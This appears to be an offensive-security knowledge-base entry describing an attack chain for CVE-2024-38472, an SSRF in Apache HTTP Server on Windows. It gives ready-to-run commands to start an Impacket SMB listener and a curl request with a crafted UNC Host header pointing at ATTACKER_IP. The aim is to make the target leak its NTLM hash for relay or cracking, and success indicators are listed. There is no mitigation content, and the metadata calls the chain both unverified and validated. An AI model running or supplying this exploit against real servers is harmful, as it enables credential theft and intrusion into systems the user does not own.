---
tags:
  - ssrf
  - ntlm-leak
  - unc-path
  - apache
  - windows
type: attack_chain
tools:
  - '[[tools/Impacket]]'
tactics:
  - '[[Initial Access]]'
verified: false
platforms:
  - Windows
  - Web
submitted: true
complexity: medium
created_at: '2024-10-04'
procedures:
  - '[[procedures/Setup-Impacket-SMB-Server-for-NTLM-Capture]]'
  - '[[procedures/Trigger-Apache-UNC-Path-SSRF]]'
step_count: 2
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T03:53:38.757Z'
description: >-
  This attack chain exploits a Server-Side Request Forgery (SSRF) vulnerability
  in Apache HTTP Server on Windows (CVE-2024-38472) by using UNC paths to force
  the server to authenticate to an attacker-controlled SMB server, leaking NTLM
  hashes.
skill_level: intermediate
impact_level: high
id: 941e2061-31cf-4cde-8c96-ce8e9c51eaf6
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Apache HTTP Server UNC Path SSRF Leading to NTLM Hash Leakage

Multi-stage attack chain demonstrating exploitation of CVE-2024-38472 in Apache HTTP Server versions 2.4.0 through 2.4.59 on Windows, allowing SSRF via UNC paths to leak NTLM hashes to an attacker-controlled server.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 2 |
| Execution Time | ~5 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Setup SMB Listener] --> B[Trigger SSRF Request]
    B --> C[Capture NTLM Hash]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- [[tools/Impacket]]
- curl (standard HTTP client)

### Target Environment

- Apache HTTP Server 2.4.0 to 2.4.59 on Windows
- Port 80 or 443 open for HTTP/HTTPS access
- Network access to target from attacker

### Initial Access Requirements

- No credentials required
- Attacker must have a public IP or reachable server for SMB (port 445)
- Direct network connectivity to target's HTTP port

## Detailed Attack Procedures

### Step 1: Setup SMB Listener
procedure: [[procedures/Setup-Impacket-SMB-Server-for-NTLM-Capture]]

**Objective**: Deploy an SMB server to listen for incoming connections and capture NTLM authentication attempts from the target.

**Instructions**: Install Impacket if not already present, then start the SMB server on the attacker's machine using [[commands/impacket-smbserver-setup]]:

```bash
pip install impacket
git clone https://github.com/SecureAuthCorp/impacket.git
cd impacket/examples
python3 smbserver.py SHARE /tmp/share -debug
```

Ensure port 445 is open and forwarded if behind NAT. The server will log authentication attempts, including NTLM hashes.

**Expected Output**: SMB server running, listening on TCP 445, ready to capture auth.

**Success Indicators**:
- Server logs show "SMB server is listening on port 445"
- No firewall blocks on port 445

### Step 2: Trigger SSRF Request
procedure: [[procedures/Trigger-Apache-UNC-Path-SSRF]]

**Objective**: Send a crafted HTTP request to the target Apache server to trigger SSRF via UNC path, forcing it to connect to the attacker's SMB server and authenticate.

**Instructions**: From the attacker's machine, use curl to send a request with a malicious Host header containing the UNC path pointing to the SMB share, via [[commands/curl-trigger-unc-ssrf]]:

```bash
curl -v -H "Host: \\\\ATTACKER_IP\\SHARE" http://TARGET_IP/
```

Replace ATTACKER_IP with your SMB server's IP and TARGET_IP with the Apache server's IP. The double backslashes are escaped for UNC format.

**Expected Output**: HTTP response from target, and simultaneous connection to SMB server.

**Success Indicators**:
- Curl shows 200 OK or similar response
- SMB server logs show incoming connection and NTLM hash from target's machine account

## Attack Chain Summary

### Key Achievements

1. Forced target server to initiate outbound SMB connection via SSRF
2. Captured NTLM hash for potential relay or cracking
3. Demonstrated impact of improper UNC path validation in Apache on Windows

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Exploit Public-Facing Application]]

### MITRE ATT&CK Tactics

- [[Initial Access]]

*Last updated: 2024-10-04*
